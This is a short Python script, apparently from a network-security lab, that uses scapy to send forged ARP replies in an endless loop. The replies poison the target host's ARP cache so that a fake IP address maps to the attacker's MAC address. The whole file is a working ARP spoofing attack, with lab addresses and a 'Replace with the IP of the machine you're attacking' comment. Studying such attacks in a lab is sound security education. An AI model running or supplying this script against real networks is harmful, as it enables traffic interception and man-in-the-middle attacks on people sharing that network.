from scapy.all import *

# Target IP and MAC address
target_ip = "10.9.0.5"  # Replace with the IP of the machine you're attacking
target_mac = "02:42:0a:09:00:05"  # Replace with the MAC address of the target machine

# Fake IP (10.9.0.99) and your MAC address
fake_ip = "10.9.0.99"
your_mac = "02:42:bc:8d:21:74" # Mac of br-

# Continuously send ARP spoofing packets
print(f"Starting ARP spoofing: Associating {fake_ip} with {your_mac}")
while True:
    arp_spoof = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=fake_ip, hwsrc=your_mac)
    send(arp_spoof, iface="br-278e1964d941", verbose=0)
    print(f"Sent ARP reply to {target_ip}: {fake_ip} is at {your_mac}")